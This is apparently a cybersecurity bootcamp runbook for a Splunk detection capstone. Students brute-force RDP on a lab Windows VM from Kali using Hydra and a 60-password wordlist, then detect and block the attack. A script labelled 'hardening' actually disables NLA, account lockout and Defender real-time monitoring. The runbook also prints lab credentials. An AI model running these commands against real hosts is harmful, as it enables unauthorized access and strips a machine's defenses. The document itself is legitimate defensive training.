# LAB-REBUILD-GUIDE.md
## Threat Detection Capstone — Single-Pass Runbook
### The Spelunker-People — Fullstack Academy Cybersecurity Bootcamp

---

> **This lab environment resets automatically every 12 hours** (Fullstack
> Academy platform constraint — not configurable). Every command below has
> already been battle-tested across dozens of rebuild cycles. This is not
> a troubleshooting document — it is the known-good sequence. Follow it
> top to bottom in one sitting. Total time: ~35–45 minutes.
>
> For failure recovery mid-run, see `CONNECTION-ISSUES.md`.

---

## Pre-Flight — 60 Seconds

```
☐ Both VMs booted and responsive
☐ You have a fresh 12-hour window (just reset, or early in the cycle)
☐ Screenshot tool ready / hotkey known
☐ This guide open on a second monitor or split screen
```

---

---

# PHASE 0 — WINDOWS (ALL OF IT, ONE PASS)

> Do every Windows step below before switching to Kali. One switch only.

---

### 0.1 — Get Kali's IP first

Boot Kali briefly, run:

```bash
ip addr show | grep "inet " | grep -v 127
```

Note it — call it `KALI_IP` for every command below. Minimize Kali.

---

### 0.2 — Install Universal Forwarder

```
https://download.splunk.com/products/universalforwarder/releases/9.4.0/windows/splunkforwarder-9.4.0-6b4ebe426ca6-windows-x64.msi
```

Installer:
```
Accept license                    → Next
Username: Admin / Password: Splunk123 → Next
Deployment Server: LEAVE BLANK    → Next
Receiving Indexer: KALI_IP:9997   → Next
Install
```

---

### 0.3 — inputs.conf (CMD as Admin, one block)

```cmd
mkdir "C:\Program Files\SplunkUniversalForwarder\etc\system\local" 2>nul
echo [WinEventLog://Security] > "C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf"
echo disabled = false >> "C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf"
echo start_from = oldest >> "C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf"
echo current_only = false >> "C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf"
echo index = main >> "C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf"
```

---

### 0.4 — outputs.conf (PowerShell as Admin — more reliable than echo)

```powershell
Set-Content "C:\Program Files\SplunkUniversalForwarder\etc\system\local\outputs.conf" "[tcpout]"
Add-Content "C:\Program Files\SplunkUniversalForwarder\etc\system\local\outputs.conf" "defaultGroup = default-autolb-group"
Add-Content "C:\Program Files\SplunkUniversalForwarder\etc\system\local\outputs.conf" ""
Add-Content "C:\Program Files\SplunkUniversalForwarder\etc\system\local\outputs.conf" "[tcpout:default-autolb-group]"
Add-Content "C:\Program Files\SplunkUniversalForwarder\etc\system\local\outputs.conf" "server = KALI_IP:9997"
```

---

### 0.5 — The ONE hardening script (run every single reset — this is the entire lesson from 29 runs)

Paste into PowerShell as Admin:

```powershell
Write-Host "=== LAB HARDENING START ===" -ForegroundColor Cyan

# Sleep — kills mid-attack connections if skipped
powercfg /change standby-timeout-ac 0
powercfg /change monitor-timeout-ac 0

# NLA — the #1 cause of Hydra dying at attempt 4-15
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0

# Security layer — fallback if /sec flags fail on xfreerdp
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0

# Lockout — Hydra triggers this in under 5 attempts otherwise
net accounts /lockoutthreshold:0

# Account state — clears forced password change + re-enables if locked
net user labuser01 /active:yes
net user labuser01 /logonpasswordchg:no

# Defender — blocks Hydra's rapid connections after ~15 attempts
Set-MpPreference -DisableRealtimeMonitoring $true

# RDP enabled
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0

# Forwarder auto-start + running now
Set-Service SplunkForwarder -StartupType Automatic
Start-Service SplunkForwarder -ErrorAction SilentlyContinue

# Pause Windows Update — steals CPU/bandwidth mid-attack
Stop-Service wuauserv -ErrorAction SilentlyContinue

# Clock sync — misaligned timestamps break the attack chain timeline
Set-TimeZone -Id "UTC"
w32tm /resync /force | Out-Null

Write-Host "`n=== VERIFICATION ===" -ForegroundColor Yellow
Write-Host "NLA:" -NoNewline; (Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication").UserAuthentication
Write-Host "Lockout:" -NoNewline; (net accounts | Select-String "Lockout threshold")
Write-Host "Forwarder:" -NoNewline; (Get-Service SplunkForwarder).Status
netstat -an | findstr 3389 | Select-Object -First 1
Write-Host "`n=== HARDENING COMPLETE — switch to Kali ===" -ForegroundColor Green
```

Save this as `lab-setup.ps1` on the Desktop once — reruns take one double-click every reset from now on.

---

⭐ **Bonus shot — inputs.conf proof**
```
inputs-conf-pipeline-config.png → screenshots/detection/
Open the file in Notepad, screenshot the 5 lines + path in title bar.
```

⭐ **Bonus shot — hardening confirmed**
```
rdp-connection-hardening-confirmed.png → screenshots/detection/
The VERIFICATION block output from the script above, in one frame.
```

---

> ✅ Windows done. Switch to Kali. Stay there through Phase 3.

---

---

# PHASE 1 — KALI SETUP

```bash
sudo apt update
wget -O splunk.tgz https://download.splunk.com/products/splunk/releases/9.4.3/linux/splunk-9.4.3-237ebbd22314-linux-amd64.tgz
sudo tar -xvzf splunk.tgz -C /opt
cd /opt/splunk/bin
sudo ./splunk start --accept-license
```
Set: `kaliuser` / `Password.3!!`

```bash
sudo /opt/splunk/bin/splunk enable listen 9997 -auth kaliuser:'Password.3!!'
sudo /opt/splunk/bin/splunk enable boot-start
sudo /opt/splunk/bin/splunk restart
sudo ss -tuln | grep 9997
```

**Verify pipeline** — browser → `http://kali:8000` → `kaliuser`/`Password.3!!` → Search & Reporting:

```splunk
index=main sourcetype="WinEventLog:Security"
```
Last 15 minutes. **Must see events before Phase 2.**

⭐ Bonus — `index=main sourcetype="WinEventLog:Security" | stats count by host` → `splunk-windows-host-connected.png`

**Tools + hardening (Kali side):**

```bash
sudo apt install netdiscover hydra freerdp3-x11 -y
rm -rf ~/.config/freerdp/server/
rm -f ~/hydra.restore
echo 'export PATH=$PATH:/opt/splunk/bin' >> ~/.bashrc
```

```bash
nano ~/passwords.txt
```
Paste the 60-line list (see Appendix A) → `Ctrl+O` → `Ctrl+X` → verify `wc -l ~/passwords.txt` = 60

---

---

# PHASE 2 — ATTACKS (stay on Kali the entire time)

### Recon

```bash
sudo netdiscover -r 10.0.0.0/24 -P
```
Note `WINDOWS_IP` (PCS Systemtechnik row). 📸 `netdiscover-host-discovered.png`

```bash
sudo nmap -sS -T4 -p- WINDOWS_IP
```
Confirm `3389/tcp open`. 📸 `nmap-3389-rdp-open-confirmed.png`

### Brute Force — the known-good command

```bash
xfreerdp /u:labuser01 /p:'Password.1!!' /v:WINDOWS_IP /cert:ignore +auth-only
```
Quick pre-check — succeeds silently or errors clearly. If it errors, see CONNECTION-ISSUES.md Quick Reference before proceeding.

```bash
hydra -l labuser01 -P ~/passwords.txt -t 1 -V -I rdp://WINDOWS_IP
```
`-t 1` and `-I` are non-negotiable — both were required to complete a run without dying mid-attack.

📸 mid-run: `hydra-brute-force-running.png`
📸 success line: `hydra-password-found-success.png`

**Splunk — 4625 spike:**
```splunk
index=main EventCode=4625
| stats count by Source_Address
| sort - count
```
📸 `splunk-4625-brute-force-spike.png`

⭐ Expand one event → `splunk-4625-raw-event-expanded.png`
⭐ `index=main EventCode=4625 | timechart span=10s count by Source_Address` (Line Chart) → `splunk-4625-attack-velocity.png`

### Access

```bash
xfreerdp /u:labuser01 /p:'Password.1!!' /v:WINDOWS_IP /cert:ignore
```
If Kerberos errors appear, fall back to `/sec:tls` or `/sec:rdp` — SecurityLayer=0 (Phase 0.5) usually makes this unnecessary.

📸 `xfreerdp-rdp-session-active.png`
⭐ CMD inside session → `whoami` → `xfreerdp-whoami-confirmed.png`
⭐ `ipconfig` → `xfreerdp-ipconfig-victim.png`
⭐ Event Viewer → Security → filter 4625 → `windows-event-viewer-4625-attack.png`

**Splunk — 4624 success:**
```splunk
index=main EventCode=4624 Logon_Type=10
| table _time, user, Source_Address, host, Logon_Type
| sort - _time
```
📸 `splunk-4624-rdp-login-success.png`
⭐ expand event → `splunk-4624-raw-event-expanded.png`

---

---

# PHASE 3 — DETECTION EVIDENCE

**Alerts** (build once — see Appendix B for all 7 SPL queries) → Activity → Triggered Alerts

📸 `splunk-triggered-alerts-fired.png`
⭐ config page of one alert → `splunk-alert-config-page.png`

**Dashboard** (build once — panels in README Section 6) → Last 60 minutes, all panels populated

📸 `splunk-dashboard-all-panels.png`

**Attack chain timeline — the single most important screenshot:**

```splunk
index=main Source_Address="KALI_IP"
(EventCode=4624 OR EventCode=4625 OR EventCode=5156 OR EventCode=5157)
| eval event_label=case(
    EventCode=5157, "Port Scan Blocked",
    EventCode=5156, "Port Scan Allowed",
    EventCode=4625, "Failed Login",
    EventCode=4624, "Successful Login — RDP")
| dedup event_label
| table _time, event_label, Source_Address
| sort _time
```
`dedup event_label` collapses thousands of events into one clean row per phase — 4 rows, full kill chain, no scrolling.

⭐ `splunk-attack-chain-timeline.png`

---

---

# PHASE 4 — CONTAINMENT (second and final Windows switch)

### Windows — firewall block

```cmd
netsh advfirewall firewall add rule name="BLOCK Kali Attacker" dir=in action=block remoteip=KALI_IP
```
`remoteip` = the attacker's IP, always. Verify:
```cmd
netsh advfirewall firewall show rule name="BLOCK Kali Attacker" verbose
```
Confirm `RemoteIP: KALI_IP/32` and `Action: Block` — **not** the Windows machine's own IP (this exact mix-up cost an entire session).

📸 `windows-firewall-block-rule-active.png`
⭐ Scope tab → `windows-firewall-rule-scope.png`

### Kali — confirm the block

```bash
xfreerdp /u:labuser01 /p:'Password.1!!' /v:WINDOWS_IP /cert:ignore
```
Expect `ERRCONNECT_CONNECT_FAILED` — that failure **is** the evidence.

⭐ `xfreerdp-connection-blocked-confirmed.png`

**Splunk — 5157 post-block:**
```splunk
index=main EventCode=5157 Source_Address="KALI_IP"
| table _time, Source_Address, dest_port
| sort - _time
```
📸 `splunk-5157-containment-confirmed.png`

⭐ Full incident timechart:
```splunk
index=main Source_Address="KALI_IP"
(EventCode=4625 OR EventCode=4624 OR EventCode=5157)
| eval phase=case(
    EventCode=4625, "Brute Force Attempts",
    EventCode=4624, "Successful Access",
    EventCode=5157, "Blocked Post-Containment")
| timechart span=1m count by phase
```
(Line Chart) → `splunk-full-incident-timechart.png`

---

---

# Appendix A — passwords.txt (60 lines)

```
password
admin
123456
letmein
welcome
qwerty
abc123
password1
iloveyou
monkey
jesus
sunshine
princess
flower
superman
batman
trustno1
ninja
hello123
admin123
welcome123
password123
12345678
123456789
qwerty123
abc123456
letmein123
adminadmin
passw0rd
Password1
Summer2026
Winter2025
Spring2026
Fall2025
Company123
User12345
Test123
Secret123
AdminPass
Login123
Backup2026
Server123
Database1
Security1
Cyber2026
Hackme123
Root123
Toor123
Changeme
Default123
Temp123
Guest123
Demo123
Lab123
Student123
Class2026
Capstone1
Password.1!!
```

---

# Appendix B — All 7 Alert SPL Queries

See README.md Section 5 for the full annotated versions with comments. Quick copy-paste:

| # | Title | Severity |
|---|---|---|
| 1 | `index=main EventCode=4625 \| bucket _time span=5s \| stats count as fail_count by Source_Address, _time \| where fail_count >= 5` | High |
| 2 | `index=main (EventCode=5156 OR EventCode=5157) \| stats dc(dest_port) as unique_ports by Source_Address \| where unique_ports > 20` | High |
| 3 | `index=main EventCode=4625 \| stats count as fail_count by Source_Address \| where fail_count >= 3 \| join type=inner Source_Address [search index=main EventCode=4624 \| stats count by Source_Address]` | High |
| 4 | `index=main (EventCode=4720 OR EventCode=4728) \| eval event_type=case(EventCode=4720,"Account Created",EventCode=4728,"Added to Privileged Group")` | High |
| 5 | `index=main EventCode=4624 \| eval hour=tonumber(strftime(_time,"%H")) \| where hour<8 OR hour>20` | Medium |
| 6 | `index=main EventCode=4625 \| stats dc(user) as unique_users, count as total_attempts by Source_Address \| where unique_users>=5` | Low |
| 7 | `index=main \| stats sum(bytes_out) as total_bytes by Source_Address, host \| where total_bytes>50000000` | Medium |

---

# Appendix C — Complete Screenshot Checklist

**Required (11)**
```
☐ netdiscover-host-discovered.png
☐ nmap-3389-rdp-open-confirmed.png
☐ hydra-brute-force-running.png
☐ hydra-password-found-success.png
☐ splunk-4625-brute-force-spike.png
☐ xfreerdp-rdp-session-active.png
☐ splunk-4624-rdp-login-success.png
☐ splunk-triggered-alerts-fired.png
☐ splunk-dashboard-all-panels.png
☐ windows-firewall-block-rule-active.png
☐ splunk-5157-containment-confirmed.png
```

**Bonus (12)**
```
☐ inputs-conf-pipeline-config.png
☐ rdp-connection-hardening-confirmed.png
☐ splunk-windows-host-connected.png
☐ splunk-4625-raw-event-expanded.png
☐ splunk-4625-attack-velocity.png
☐ xfreerdp-whoami-confirmed.png
☐ xfreerdp-ipconfig-victim.png
☐ windows-event-viewer-4625-attack.png
☐ splunk-4624-raw-event-expanded.png
☐ splunk-alert-config-page.png
☐ splunk-attack-chain-timeline.png
☐ windows-firewall-rule-scope.png
☐ xfreerdp-connection-blocked-confirmed.png
☐ splunk-full-incident-timechart.png
```

**Priority if time runs out before reset:** attack-chain-timeline → whoami → full-incident-timechart → 4625-raw-expanded → hardening-confirmed

---

*The Spelunker-People — Fullstack Academy Cybersecurity Bootcamp — April 2026*
